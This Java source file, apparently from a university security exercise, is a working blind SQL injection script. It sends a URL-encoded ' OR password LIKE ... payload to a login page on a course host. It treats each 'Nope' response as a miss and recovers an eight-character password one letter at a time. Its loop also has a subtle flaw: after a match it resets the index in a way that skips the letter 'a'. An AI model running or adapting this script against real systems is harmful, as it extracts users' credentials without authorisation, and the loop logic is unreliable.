import java.io.BufferedReader;
import java.io.IOException;

import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.sql.*;


/**SQL
 * Created by jaredkoh on 8/3/15.
 */

public class SQLInject {
    public static void main(String args[]) throws IOException, SQLException {
        String password = "";
        char[] alphabets = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        for (int i = 0; i < alphabets.length; i++) {
            if (password.length() != 8) {
                String alphabet = String.valueOf(alphabets[i]);
                String addOn = "%27%20OR%20password%20LIKE%20%27" + password + alphabet + "%";
                String website = "http://st223.dcs.kcl.ac.uk/osc2/rain.php?username=rain&password=somepassword" + addOn;
                try {
                    URL url = new URL(website);
                    URLConnection urlConnection = url.openConnection();
                    urlConnection.connect();
                    BufferedReader in = new BufferedReader(new InputStreamReader(
                            urlConnection.getInputStream()));
                    String inputLine;
                    inputLine = in.readLine();
                    if (!inputLine.contains("Nope")) {
                        password += alphabets[i];
                        i = 0;
                    }
                    in.close();
                } catch (Exception e) {
                    System.out.println("EXCEPTION! Maybe internet is down");
                }
            } else {
                break;
            }
        }
        System.out.println(password);
    }
}